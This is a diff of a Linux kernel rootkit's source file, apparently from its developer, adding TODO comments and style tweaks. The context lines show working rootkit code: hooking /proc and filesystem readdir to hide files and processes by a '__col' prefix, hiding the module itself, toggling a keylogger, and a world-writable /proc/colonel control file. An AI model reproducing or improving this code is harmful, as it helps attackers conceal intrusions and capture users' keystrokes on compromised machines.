@@ -1,3 +1,4 @@
+// PIDS BY PREFIX???
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
@@ -68,7 +69,7 @@ void hide_module(void) {
 void show_module(void) {
 	int restore;
 
-	if (!hidden_module) {												/* if already showing, return with no error */
+	if (!hidden_module) {												/* if already showing (0), return with no error */
 		return;
 	}
 
@@ -97,6 +98,7 @@ static void set_addr_ro(void *addr) {									/* resets to original permissions 
 
 /* THE CUSTOM SHOP */
 /* Where the classics get a fresh look */
+// REWRITE TO HIDE BY PREFIX???
 static int new_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, 
 u64 ino, unsigned d_type) {
 	int i;
@@ -117,7 +119,7 @@ static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) 
 	og_proc_filldir = filldir; 											/* stores the original filldir */
 	return og_proc_readdir(filp, dirent, new_proc_filldir);				/* passes the modified function */
 }
-
+// LOOK AT HEADER FOR OG DEFS --- MAKE BETTER
 static int new_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, 
 						  u64 ino, unsigned d_type) {
 	if (hidden_files && (!strncmp(name, "__col", 5) || !strncmp(name, "7-__col", 7))) {	/* hides the file if prefix matches */
@@ -194,7 +196,7 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 	} else if (!strncmp(buff, "tls", MIN(3, count))) {					/* toggle keylogger on/off */
 		key_logger = !key_logger;
 
-	} else if (!strncmp(buff, "thf", MIN(3, count))) {					/*toggles hidden_files in fs */
+	} else if (!strncmp(buff, "thf", MIN(3, count))) {					/* toggles hidden_files in fs */
 		hidden_files = !hidden_files;
 
 	} else if (!strncmp(buff, "mh", MIN(2, count))) {					/* hide module (rootkit) */
@@ -208,20 +210,20 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 }
 
 /* CLEAN/INIT FUNCTIONS */
-/* NULL checks for sanity */
+/* NULL checks for sanity */ 
 static void clean_procfs(void) {
 	if (proc_colonel != NULL) {
 		remove_proc_entry("colonel", NULL);								/* removes /proc/colonel */
 		proc_colonel = NULL;
 	}
-
+// THINK set_addr_rw NEEDS TO BE BELOW THE REASSIGNMENT
 	if (proc_fops != NULL && og_proc_readdir != NULL) {
 		set_addr_rw(proc_fops);
 		proc_fops->readdir = og_proc_readdir;							/* restores the original /proc readdir */
 		set_addr_ro(proc_fops);
 	}
 }
-	
+// THINK set_addr_rw NEEDS TO BE BELOW THE REASSIGNMENT
 static void clean_fs(void) {
 	if (fs_fops != NULL && og_fs_readdir != NULL) {
 		set_addr_rw(fs_fops);
@@ -232,12 +234,13 @@ static void clean_fs(void) {
 
 static int __init procfs_init(void) {
 	proc_colonel = create_proc_entry("colonel", 0666, NULL);			/* creates /proc/colonel in root */
-	if (proc_colonel == NULL) {
+
+	if (NULL == proc_colonel) {
 		return 0;
 	}
 
 	proc_root = proc_colonel->parent;
-	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
+	if (NULL == proc_root || strcmp(proc_root->name, "/proc") != 0) {
 		return 0;
 	}
 
@@ -258,7 +261,8 @@ static int __init fs_init(void) {
 	struct file *etc_filp;
 	
 	etc_filp = filp_open("/etc", O_RDONLY, 0);							/* retrieves file_operations of /etc */
-	if (etc_filp == NULL) {
+
+	if (NULL == etc_filp) {
 		return 0;
 	}
 
